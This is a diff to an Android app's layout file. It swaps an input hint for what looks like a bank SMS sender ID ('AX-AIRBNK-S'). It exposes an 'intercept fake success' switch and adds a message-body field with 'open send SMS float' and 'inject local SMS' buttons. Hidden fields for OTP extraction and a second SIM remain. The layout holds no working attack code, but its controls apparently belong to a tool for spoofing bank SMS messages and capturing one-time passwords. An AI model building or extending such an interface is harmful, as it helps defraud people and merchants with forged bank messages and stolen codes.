@@ -259,11 +259,60 @@
                     android:layout_width="match_parent"
                     android:layout_height="wrap_content"
                     android:background="@drawable/input_background"
-                    android:hint="JK-AXISBK-S"
-                    android:inputType="text"
+                    android:hint="AX-AIRBNK-S"
+                    android:inputType="textCapCharacters"
                     android:padding="12dp"
                     android:textColor="@color/text_primary"
                     android:textColorHint="@color/text_hint" />
+
+                <com.google.android.material.switchmaterial.SwitchMaterial
+                    android:id="@+id/switchInterceptFakeSuccess"
+                    style="@style/HivirtusSwitch"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:layout_marginTop="8dp"
+                    android:text="@string/intercept_fake_success"
+                    android:textColor="@color/text_primary" />
+
+                <TextView
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:layout_marginTop="12dp"
+                    android:text="@string/message_body"
+                    android:textColor="@color/text_secondary"
+                    android:textSize="12sp" />
+
+                <EditText
+                    android:id="@+id/etMessageBody"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:background="@drawable/input_background"
+                    android:gravity="top"
+                    android:hint="@string/message_body_hint_short"
+                    android:inputType="textMultiLine"
+                    android:minLines="2"
+                    android:padding="12dp"
+                    android:textColor="@color/text_primary"
+                    android:textColorHint="@color/text_hint" />
+
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btnOpenSendSmsFloat"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:layout_marginTop="8dp"
+                    android:background="@drawable/button_gradient"
+                    android:text="@string/open_send_sms_float"
+                    android:textColor="@color/button_text_on_gold"
+                    app:backgroundTint="@null" />
+
+                <com.google.android.material.button.MaterialButton
+                    android:id="@+id/btnInjectLocalSms"
+                    android:layout_width="match_parent"
+                    android:layout_height="wrap_content"
+                    android:layout_marginTop="6dp"
+                    android:text="@string/inject_local_sms"
+                    android:textColor="@color/gold_primary"
+                    style="@style/Widget.MaterialComponents.Button.OutlinedButton" />
             </LinearLayout>
 
             <LinearLayout
@@ -354,11 +403,6 @@
                 android:layout_height="0dp"
                 android:visibility="gone" />
             <com.google.android.material.switchmaterial.SwitchMaterial
-                android:id="@+id/switchInterceptFakeSuccess"
-                android:layout_width="0dp"
-                android:layout_height="0dp"
-                android:visibility="gone" />
-            <com.google.android.material.switchmaterial.SwitchMaterial
                 android:id="@+id/switchAutoExtractOtp"
                 android:layout_width="0dp"
                 android:layout_height="0dp"
@@ -375,11 +419,6 @@
                 android:visibility="gone" />
             <EditText
                 android:id="@+id/etPhoneSim2"
-                android:layout_width="0dp"
-                android:layout_height="0dp"
-                android:visibility="gone" />
-            <EditText
-                android:id="@+id/etMessageBody"
                 android:layout_width="0dp"
                 android:layout_height="0dp"
                 android:visibility="gone" />
